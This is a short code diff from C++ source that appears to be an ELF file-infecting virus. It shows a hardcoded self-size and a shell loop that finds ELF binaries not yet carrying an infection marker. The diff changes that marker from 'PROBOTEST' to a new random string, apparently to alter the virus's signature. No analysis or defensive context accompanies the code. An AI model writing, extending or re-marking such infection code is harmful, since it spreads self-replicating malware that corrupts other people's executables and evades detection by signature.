@@ -2,7 +2,7 @@
 #include <fstream>
 #include <unistd.h>
 
-const char* IDENTIFIER = "PROBOTEST";
+const char* IDENTIFIER = "XAUVCUGCEIFS";
 const int MYSIZE = 19576;
 
 using namespace std;
@@ -53,7 +53,7 @@ int main (int argc, char** argv) {
         command += "`; \
 do \
 file $n | grep -q ELF && ( \
-grep -q PROBOTEST $n || \
+grep -q XAUVCUGCEIFS $n || \
 echo \"$n\" \
 ); \
 done | tail -1); \
